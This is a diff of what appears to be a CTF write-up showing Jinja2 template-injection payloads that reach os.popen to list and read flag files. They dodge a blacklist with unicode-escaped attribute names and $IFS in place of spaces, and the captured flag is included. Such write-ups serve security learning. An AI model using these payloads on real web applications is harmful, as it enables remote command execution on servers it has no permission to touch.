@@ -66,11 +66,17 @@ decode -> `lipsum|attr('__globals__'))|attr('__getitem__')('os')|attr('popen')('
 
 `ls$IFS-t` -> sort files by time
 
-Payload
 ```
-{{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('cat$IFS/opt/tmuctf/r3zQnO1s31')|attr('read')()}}
+{{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('ls$IFS-t$IFS/opt/tmuctf/')|attr('read')()}}
+```
+
+Payload get flag (read first file after sorting)
+```
+{{lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u006f\u0073')|attr('\u0070\u006f\u0070\u0065\u006e')('cat$IFS/opt/tmuctf/vaYxVj7si8')|attr('read')()}}
 ```
 Final -> decode base64
+
+Flag -> `TMUCTF{0h!_y0u_byp4553d_4ll_my_bl4ckl157!!!__1_5h0uld_h4v3_b33n_m0r3_c4r3ful}`
 
 ## Challenge Fake Registration
 ```py
